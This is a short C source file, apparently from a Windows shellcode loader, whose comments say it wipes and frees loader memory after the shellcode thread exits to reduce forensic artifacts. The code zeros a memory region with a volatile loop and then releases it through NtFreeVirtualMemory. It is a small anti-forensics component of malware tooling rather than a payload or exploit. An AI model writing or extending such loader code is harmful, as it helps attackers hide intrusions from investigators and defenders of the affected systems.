/*
 * cleanup.c — Memory cleanup after shellcode execution.
 *
 * Zeros and frees loader memory to reduce forensic artifacts.
 * Called after the shellcode thread exits.
 */
#include "loader.h"
#include "services.h"

void cleanup_region(void *base, SIZE_T size) {
    if (!base || !size) return;
    /* Zero before freeing */
    volatile uint8_t *p = (volatile uint8_t *)base;
    for (SIZE_T i = 0; i < size; i++) p[i] = 0;
    if (_NtFreeVirtualMemory) {
        SIZE_T sz = size;
        _NtFreeVirtualMemory((HANDLE)-1, &base, &sz, MEM_RELEASE);
    }
}

void cleanup_loader(void *loader_base, SIZE_T loader_size) {
    cleanup_region(loader_base, loader_size);
}
